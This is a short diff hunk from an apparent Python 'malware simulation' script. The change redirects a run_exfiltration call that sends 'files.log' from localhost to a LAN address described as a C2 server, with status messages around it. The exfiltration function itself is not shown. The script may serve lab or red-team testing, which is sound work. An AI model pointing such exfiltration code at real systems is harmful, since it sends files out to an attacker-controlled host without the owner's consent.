@@ -39,7 +39,7 @@ def main():
 
     # Step 3: Exfiltrate log
     print("[*] Exfiltrating log file to C2 server...")
-    run_exfiltration("files.log", "http://localhost:8080")
+    run_exfiltration("files.log", "http://192.168.1.18:8080")
 
     print("[✓] Malware simulation completed successfully.")
 
